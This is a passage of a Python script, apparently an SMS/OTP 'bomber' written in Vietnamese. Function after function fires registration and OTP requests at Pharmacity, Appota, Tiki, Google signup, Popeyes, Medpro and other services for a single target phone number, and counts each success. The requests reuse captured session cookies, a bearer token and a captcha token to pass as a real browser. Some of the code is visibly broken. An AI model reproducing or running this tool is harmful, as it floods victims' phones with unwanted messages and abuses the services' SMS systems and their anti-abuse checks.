        'https://data-service.pharmacity.io/pmc-ecm-webapp-config-api/production/banner/654%20x%20324-1684304235294.png',
        headers=headers,
    )


    headers = {
        'authority': 'api-gateway.pharmacity.vn',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'access-control-request-headers': 'content-type',
        'access-control-request-method': 'POST',
        'origin': 'https://www.pharmacity.vn',
        'referer': 'https://www.pharmacity.vn/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    response = requests.options('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers)


    headers = {
        'authority': 'api-gateway.pharmacity.vn',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://www.pharmacity.vn',
        'referer': 'https://www.pharmacity.vn/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'referral': '',
    }

    response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, json=json_data)
    if 'success' in response.text:
        print(format_print("$","PHARMACITY: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","PHARMACITY: THẤT BẠI"))
def appota(phone):
    global thanhcong
    cookies = {
        '_fbp': 'fb.1.1682774999293.1986473311',
        '_gid': 'GA1.2.1851095031.1685335457',
        '_gat_gtag_UA_74938948_3': '1',
        '_ga_SQM4TCSQGX': 'GS1.1.1685335456.1.0.1685335456.0.0.0',
        '_gat': '1',
        '_ga_8W5EGNGFDP': 'GS1.1.1685335477.2.0.1685335477.0.0.0',
        '_ga': 'GA1.1.2134755738.1682774948',
        'amp_6e403e': 'jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1it4n3u.1h1it53ob.0.6.6',
        'pay_session': 'eyJpdiI6IlhvQ0p3NG9INUhYWkpGeEZVSmVjRGc9PSIsInZhbHVlIjoiUlBXMExaMlMzaGxIWmlTeHFHK29TZHBUVDhBd2daaHZWS0owRXA0UllBRkg1dHYyV3JXYmEwZ0k4YVJocFFEOEh4MVF4QTR1aFBiMFNcL0tnTmZ1SXlBPT0iLCJtYWMiOiJjOGUxZGE4YmZlNTM3NTgzZDA5ZmYzOTY4NTQyNDM3YjJiM2EyODI2MjJiY2RkNDBiYjM1MGZmYWJkZTBhMmE3In0%3D',
    }

    headers = {
        'authority': 'vi.appota.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
         'cookie': '_fbp=fb.1.1682774999293.1986473311; _gid=GA1.2.1851095031.1685335457; _gat_gtag_UA_74938948_3=1; _ga_SQM4TCSQGX=GS1.1.1685335456.1.0.1685335456.0.0.0; _gat=1; _ga_8W5EGNGFDP=GS1.1.1685335477.2.0.1685335477.0.0.0; _ga=GA1.1.2134755738.1682774948; amp_6e403e=jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1it4n3u.1h1it53ob.0.6.6; pay_session=eyJpdiI6IlhvQ0p3NG9INUhYWkpGeEZVSmVjRGc9PSIsInZhbHVlIjoiUlBXMExaMlMzaGxIWmlTeHFHK29TZHBUVDhBd2daaHZWS0owRXA0UllBRkg1dHYyV3JXYmEwZ0k4YVJocFFEOEh4MVF4QTR1aFBiMFNcL0tnTmZ1SXlBPT0iLCJtYWMiOiJjOGUxZGE4YmZlNTM3NTgzZDA5ZmYzOTY4NTQyNDM3YjJiM2EyODI2MjJiY2RkNDBiYjM1MGZmYWJkZTBhMmE3In0%3D',
        'dnt': '1',
        'origin': 'https://vi.appota.com',
        'referer': 'https://vi.appota.com/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone_number': phone,
    }

    response = requests.post('https://vi.appota.com/check-phone-register.html', cookies=cookies, headers=headers, data=data)
    if 'true' in response.text:
        print(format_print("$","APPOTA: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","APPOTA: THẤT BẠI"))
def mocha(phone):
    global thanhcong
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'DNT': '1',
        'Origin': 'https://video.mocha.com.vn',
        'Referer': 'https://video.mocha.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'msisdn': phone,
        'languageCode': 'vi',
    }

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
    if '200' in response.text:
        print(format_print("$","MOCHA: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","MOCHA: THẤT BẠI"))
def vntrip(phone):
    global thanhcong
    try:
        json_data = {
            'feature': 'register',
            'phone': phone,
            }

        response_vntrip = requests.post('https://micro-services.vntrip.vn/core-user-service/verification/request/phone', headers=self.ua, json=json_data).text
        print(format_print("$","VNTRIP: THÀNH CÔNG"))
        thanhcong+=1
    except:
            print(format_print("$","VNTRIP: THẤT BẠI"))
def tiki(phone):
    global thanhcong
    try:
        json_data = {
                'phone_number': phone,
            }
        response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=self.ua, json=json_data).text
        print(format_print("$","TIKI: THÀNH CÔNG"))
        thanhcong+=1
    except:
        print(format_print("$","TIKI: THẤT BẠI"))
def moca(phone):
    global thanhcong
    headers = {
        'Host': 'moca.vn',
        'Accept': '*/*',
        'Device-Token': '20212544654',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept-Language': 'vi',
        'X-Moca-Api-Version': '2',
        'platform': 'P_IOS-2.10.42',
        'User-Agent': 'Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00)',
    }
    params = {
            'phoneNumber': phone,
        }
    try:
        home = requests.get('https://moca.vn/moca/v2/users/role', params=params, headers=headers).json()
        token = home['data']['registrationId']
        response = requests.post(f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headers).json()
        print(format_print("$","MOCA: THÀNH CÔNG"))
        thanhcong+=1
    except:
        print(format_print("$","MOCA: THẤT BẠI"))
def google(phone):
    global thanhcong
    cookies = {
        'AEC': 'AUEFqZfyv1s_YSRiF7Cok-9mH6u9vza_Wxd12Y8dGUphjqhQsjU4vdRNk8E',
        'NID': '511=slru8btq0T4oImGUochvfEIJ7SQs4_YzFNT2-ENnVFNhk8bJJ3YQ0auUvAWnBE4OAACt3vP9y7-YnpoOnFxZiPUpdtqtZGOmtIZ9bhPtdN8oLaL6LYl8b-KjUf4qJe1V6ZRtttXrm2Xwa3Hxc08W_T-5N9A8qgCrDognejPl0QnbO1-LSmw',
        '1P_JAR': '2023-05-29-08',
        '__Host-GAPS': '1:WvGNaTHnGR1YnnwcwJNl-EUWRzRp_g:pQxfcoqbq2haYUNj',
    }

    headers = {
        'authority': 'accounts.google.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
         'cookie': 'AEC=AUEFqZfyv1s_YSRiF7Cok-9mH6u9vza_Wxd12Y8dGUphjqhQsjU4vdRNk8E; NID=511=slru8btq0T4oImGUochvfEIJ7SQs4_YzFNT2-ENnVFNhk8bJJ3YQ0auUvAWnBE4OAACt3vP9y7-YnpoOnFxZiPUpdtqtZGOmtIZ9bhPtdN8oLaL6LYl8b-KjUf4qJe1V6ZRtttXrm2Xwa3Hxc08W_T-5N9A8qgCrDognejPl0QnbO1-LSmw; 1P_JAR=2023-05-29-08; __Host-GAPS=1:WvGNaTHnGR1YnnwcwJNl-EUWRzRp_g:pQxfcoqbq2haYUNj',
        'google-accounts-xsrf': '1',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/signup/v2/webgradsidvphone?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&flowName=GlifWebSignIn&flowEntry=SignUp&TL=AG7eRGAfSwd6O1RN-Co-tlKxLzw8PXX72Uex6u7jEpolIzlDFuSKmOzv_XqS5LLS',
        'sec-ch-ua': '"Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-full-version': '"113.0.5672.127"',
        'sec-ch-ua-full-version-list': '"Chromium";v="113.0.5672.127", "Not-A.Brand";v="24.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-same-domain': '1',
    }
    params = {
        'hl': 'vi',
        'TL': 'AG7eRGAfSwd6O1RN-Co-tlKxLzw8PXX72Uex6u7jEpolIzlDFuSKmOzv_XqS5LLS',
        '_reqid': '256117',
        'rt': 'j',
    }

    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&flowEntry=SignUp&flowName=GlifWebSignIn&service=mail&f.req=%5B%22TL%3AAG7eRGAfSwd6O1RN-Co-tlKxLzw8PXX72Uex6u7jEpolIzlDFuSKmOzv_XqS5LLS%22%2Cnull%2C%22'+phone+'%22%2C%22vn%22%2C3%2Cnull%2C1%2C0%2C%5B%5D%2C0%2C1%5D&azt=AFoagUWmC509h-ofv2cTa3SFC3wrixE0DA%3A1685349301296&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22VN%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&'

    response = requests.post('https://accounts.google.com/_/signup/sendidv', params=params, cookies=cookies, headers=headers, data=data)
    if ',1,' in response.text:
        print(format_print("$","GOOGLE: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","GOOGLE: THẤT BẠI"))
import requests
import random
def random_string(length):
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    result = ""
    for _ in range(length):
        result += random.choice(characters)
        return result
random_str = random_string(10)
random_str1 = random_string(3)
z = random_string(40)
tk=random_string(10)
mk=random_string(20)
def popeyes(phone):
    global thanhcong
    cookies = {
        '_gcl_au': '1.1.249067755.1685496181',
        'amp_6e403e': 'jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1nmdcfd.1h1nmdcfg.0.1.1',
        '_gid': 'GA1.2.1846166912.1685496182',
        '_gat_UA-106834068-1': '1',
        '_gat_UA-125045715-1': '1',
        '_gat_UA-149855316-1': '1',
        '_gat_UA-149692826-1': '1',
        '_ga': 'GA1.1.911913347.1685496182',
        '__admUTMtime': '1685496182',
        '__uidac': 'bfea265080b5460a11f8c8b9aeb923ea',
        '_ga_Y4V7XHSR6R': 'GS1.1.1685496182.1.0.1685496182.0.0.0',
        '__iid': '',
        '__su': '0',
        '_ga_4YCG78W1LS': 'GS1.1.1685496181.1.0.1685496187.0.0.0',
        '_ga_X3WSB3MZGL': 'GS1.1.1685496181.1.1.1685496204.37.0.0',
    }

    headers = {
        'authority': 'api.popeyes.vn',
        'accept': 'application/json',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
         'cookie': '_gcl_au=1.1.249067755.1685496181; amp_6e403e=jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1nmdcfd.1h1nmdcfg.0.1.1; _gid=GA1.2.1846166912.1685496182; _gat_UA-106834068-1=1; _gat_UA-125045715-1=1; _gat_UA-149855316-1=1; _gat_UA-149692826-1=1; _ga=GA1.1.911913347.1685496182; __admUTMtime=1685496182; __uidac=bfea265080b5460a11f8c8b9aeb923ea; _ga_Y4V7XHSR6R=GS1.1.1685496182.1.0.1685496182.0.0.0; __iid=; __su=0; _ga_4YCG78W1LS=GS1.1.1685496181.1.0.1685496187.0.0.0; _ga_X3WSB3MZGL=GS1.1.1685496181.1.1.1685496204.37.0.0',
        'dnt': '1',
        'origin': 'https://popeyes.vn',
        'referer': 'https://popeyes.vn/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-client': 'WebApp',
    }

    json_data = {
        'phone': phone,
        'firstName': 'văn',
        'lastName': 'le',
        'email': 'abc123@gmail.com',
    }

    response = requests.post('https://api.popeyes.vn/api/v1/register', cookies=cookies, headers=headers, json=json_data)
    if '"message":null'in response.text:
        print(format_print("$","POPEYES: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","POPEYES: THẤT BẠI"))
def medpro(phone):
    global thanhcong
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        'DNT': '1',
        'Origin': 'https://id-v121.medpro.com.vn',
        'Referer': 'https://id-v121.medpro.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'appid': 'medpro',
        'cskhtoken': '',
        'locale': '',
        'momoid': '',
        'osid': '',
        'ostoken': '',
        'partnerid': 'medpro',
        'platform': 'pc',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'fullname': 'người dùng medpro',
        'deviceId': '1a27c3f208891176783815134edea038',
        'phone': phone,
        'type': 'password',
    }

    response = requests.post('https://api-v2.medpro.com.vn/user/phone-register', headers=headers, json=json_data)
    if '"status":true' in response.text:
        print(format_print("$","MEDPRO: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","MEDPRO: THẤT BẠI"))
def best_express(phone):
    global thanhcong
    headers = {
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Origin': 'https://best-inc.vn',
        'Referer': 'https://best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    json_data = {
        'phoneNumber': phone,
        'verificationCodeType': 1,
    }

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
    if '"status":true' in response.text:
        print(format_print("$","Best EXPRESS: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","Best EXPRESS: THẤT BẠI"))
def onlandtech(phone):
    global thanhcong
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6InVUOGQrZmNJMTlKM2tmRW5MVWpRZkE9PSIsInZhbHVlIjoiZU1TMHVzL2FScXZzY1M0MWRGb29HWGpTQ0JnWXp1aXBHR0F3Z3pSN3JlempwMnVmVE1uS095UnBDZzlXd21sN2l6NmhRbUg4U0t2YmZqMzhXWWFtbUFkUjU3Y0c5bHNTUUN0b25qc1gwZ1pOVFBTZlY1VHlieEpBMDdVVmY1cVAiLCJtYWMiOiIwNDE2YjFhZjU0ZmQzYTQyZjk3Y2ZmYzdiYjg2ZWUxYTQ4YzE4MGI4YWJkNWY5MmYwOTRiNjI5ZmFlM2Y4OWU4IiwidGFnIjoiIn0%3D',
        'onland_bat_dong_san_online_session': 'eyJpdiI6InovVlZVMlNMZzdzRnhXbEpiOWJiV2c9PSIsInZhbHVlIjoiOWgvZVNDUTREOXYxazNlTVBKcmZ1ZmhNYitQMHhGcjdOOUEvYjl4K0JpWnBFU25IdE9NdWVoU0NEbWFpUVhaSnI0cjBLMnNaU2IyUTJweitCWVVhRWNTVVhlc3lQT3J5UU81L0hkZHlxaUs1MmJVTmNSdFFTYzh2d1dQRGJsQjUiLCJtYWMiOiJmZGJkZmQ5ZjM5OGViZWY0ZTVhZjNhZmU5OGY0OGYzZDM1M2YyMjBkNDgwMGRlMGViMjljNGRjM2NhZjJkMDE5IiwidGFnIjoiIn0%3D',
    }
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryQlycPalf1tP24YxV',
         'Cookie': 'XSRF-TOKEN=eyJpdiI6InVUOGQrZmNJMTlKM2tmRW5MVWpRZkE9PSIsInZhbHVlIjoiZU1TMHVzL2FScXZzY1M0MWRGb29HWGpTQ0JnWXp1aXBHR0F3Z3pSN3JlempwMnVmVE1uS095UnBDZzlXd21sN2l6NmhRbUg4U0t2YmZqMzhXWWFtbUFkUjU3Y0c5bHNTUUN0b25qc1gwZ1pOVFBTZlY1VHlieEpBMDdVVmY1cVAiLCJtYWMiOiIwNDE2YjFhZjU0ZmQzYTQyZjk3Y2ZmYzdiYjg2ZWUxYTQ4YzE4MGI4YWJkNWY5MmYwOTRiNjI5ZmFlM2Y4OWU4IiwidGFnIjoiIn0%3D; onland_bat_dong_san_online_session=eyJpdiI6InovVlZVMlNMZzdzRnhXbEpiOWJiV2c9PSIsInZhbHVlIjoiOWgvZVNDUTREOXYxazNlTVBKcmZ1ZmhNYitQMHhGcjdOOUEvYjl4K0JpWnBFU25IdE9NdWVoU0NEbWFpUVhaSnI0cjBLMnNaU2IyUTJweitCWVVhRWNTVVhlc3lQT3J5UU81L0hkZHlxaUs1MmJVTmNSdFFTYzh2d1dQRGJsQjUiLCJtYWMiOiJmZGJkZmQ5ZjM5OGViZWY0ZTVhZjNhZmU5OGY0OGYzZDM1M2YyMjBkNDgwMGRlMGViMjljNGRjM2NhZjJkMDE5IiwidGFnIjoiIn0%3D',
        'DNT': '1',
        'Origin': 'https://onlandtech.vn',
        'Referer': 'https://onlandtech.vn/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = '------WebKitFormBoundaryQlycPalf1tP24YxV\r\nContent-Disposition: form-data; name="_token"\r\n\r\nmQjcMdKuL8CmNjg65NLSgi3flcxnXYuBCQdXDmpX\r\n------WebKitFormBoundaryQlycPalf1tP24YxV\r\nContent-Disposition: form-data; name="user_type"\r\n\r\nbidder\r\n------WebKitFormBoundaryQlycPalf1tP24YxV\r\nContent-Disposition: form-data; name="name"\r\n\r\nle van an\r\n------WebKitFormBoundaryQlycPalf1tP24YxV\r\nContent-Disposition: form-data; name="phone"\r\n\r\n'+phone+'\r\n------WebKitFormBoundaryQlycPalf1tP24YxV\r\nContent-Disposition: form-data; name="email"\r\n\r\n\r\n------WebKitFormBoundaryQlycPalf1tP24YxV\r\nContent-Disposition: form-data; name="password"\r\n\r\n'+mk+'\r\n------WebKitFormBoundaryQlycPalf1tP24YxV\r\nContent-Disposition: form-data; name="password_confirmation"\r\n\r\n'+mk+'\r\n------WebKitFormBoundaryQlycPalf1tP24YxV\r\nContent-Disposition: form-data; name="tax"\r\n\r\n\r\n------WebKitFormBoundaryQlycPalf1tP24YxV\r\nContent-Disposition: form-data; name="tax_date"\r\n\r\n2000-01-01\r\n------WebKitFormBoundaryQlycPalf1tP24YxV\r\nContent-Disposition: form-data; name="tax_address"\r\n\r\ntp HCM\r\n------WebKitFormBoundaryQlycPalf1tP24YxV\r\nContent-Disposition: form-data; name="presenter"\r\n\r\n\r\n------WebKitFormBoundaryQlycPalf1tP24YxV--\r\n'

    response = requests.post('https://onlandtech.vn/register', cookies=cookies, headers=headers, data=data)
    if '200' in response.text:
        print(format_print("$","ONLANDTECH: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","ONLANDTECH: THẤT BẠI"))
def meeyland(phone):
    global thanhcong
    headers = {
        'authority': 'v3.meeyid.com',
        'accept': '*/*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://meeyland.com',
        'referer': 'https://meeyland.com/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-affilate-id': 'www.google.com',
        'x-browser-id': 'undefined',
        'x-client-id': 'meeyland',
        'x-partner-id': '',
    }

    json_data = {
        'phone': phone,
        'phoneCode': '+84',
        'refCode': '',
    }

    response = requests.post('https://v3.meeyid.com/auth/v4.1/register-with-phone', headers=headers, json=json_data)
    if '"status":true' in response.text:
        print(format_print("$","MEEYLAND: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","MEEYLAND: THẤT BẠI"))
def king_food(phone):
    global thanhcong
    headers = {
        'authority': 'api.onelife.vn',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://kingfoodmart.com',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    json_data = {
        'operationName': 'SendOTP',
        'variables': {
            'phone': phone,
        },
        'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
    if 'INVALID' in response.text:
        print(format_print("$","KING FOOD: THẤT BẠI"))
    else:
        print(format_print("$","KING FOOD: THÀNH CÔNG"))
        thanhcong+=1
def poca(phone):
    global thanhcong
    headers = {
        'authority': 'api-web-writeside.pocavietnam.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://pocavietnam.com',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post('https://api-web-writeside.pocavietnam.com/v1/auth/sign-up/send-otp', headers=headers, json=json_data)
    if 'token' in response.text:
        print(format_print("$","POCA: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","POCA: THẤT BẠI"))
def nutifood(phone):
    global thanhcong
    headers = {
        'authority': 'api.nutifoodshop.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer 3a080de28c50bc0e83c54d841d3b200fdc95b09df70e7ea19b716a1c28910eb8',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://nutifoodshop.com',
        'referer': 'https://nutifoodshop.com/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'token': '03AL8dmw8i73cj7VS4_H4ED9v7uenx36cYUTihmDEPyV4gi4ITlJhHOiYIVAat7NJx5ue6sXO1M4jQyCKZUUd5UgPVcgi0xvA5u8sEgdCaH2CC8jO-geYDLfqy9S6c12EtjNpt9r47Pa-XpX1-JLGaeH_sqAkzYNtPAxMBjcQBPDoVp9_1m5fIdHfpU9qSu4PB4JmG8pwt8CQiObzzwWlgDMuKG4tKUVzsaj_kT4qQS-ZdKcfUko9EX4j4eLR_0yhHV_YCjeC8Uipzm8ayk6lPrhIXMGimIsoW54dJX85FZ-NM4Ru0iWrdbxwkvV0lj_fBf4EEbOpI6WsyG1ol_rLsI0whnWbtH9_4A7W8rTdW25WZN1cQbd3CP-43mEE0bnTuX4IhzeSwu1eAwDfLuBqM00oTPkcxQUW-lAZYbE-3vyqHzGYW46vFhbpFr8-iCeoS6tYXFC0F_roz786GD31PlHMJP7F4VO57-W6xCzVZsBijeXdjS1p2KHGuGZORWyAVmnD2BhHweRMxm5qJAVz_YVj35N_ITstwVJyDUU4Ptwn1jwBzhzdc4Go',
